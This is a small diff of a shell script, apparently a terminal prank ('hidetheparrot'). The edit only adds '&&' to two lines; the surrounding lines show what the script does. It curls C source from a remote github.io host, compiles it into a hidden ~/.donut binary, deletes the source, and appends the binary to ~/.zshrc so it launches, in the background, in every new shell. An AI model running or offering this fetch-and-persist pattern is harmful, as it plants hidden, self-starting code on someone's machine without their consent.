@@ -63,13 +63,13 @@ function normal_donut {
 	curl -s https://kasderooi.github.io/hidetheparrot.xyz/donut > ~/donut.c
 	gcc ~/donut.c -o ~/.donut
 	rm ~/donut.c
-	echo "echo \"~/.donut\" >> ~/.zshrc" > ~/.doit.sh
+	echo "echo \"~/.donut\" >> ~/.zshrc" > ~/.doit.sh &&
 	echo "~/.donut" >> ~/.shape.sh
 }
 
 function fixed_donut {
 	normal_donut
-	sed -i.bak 's/donut/donut \&/g' ~/.doit.sh
+	sed -i.bak 's/donut/donut \&/g' ~/.doit.sh &&
 	rm doit.sh.bak
 }
 
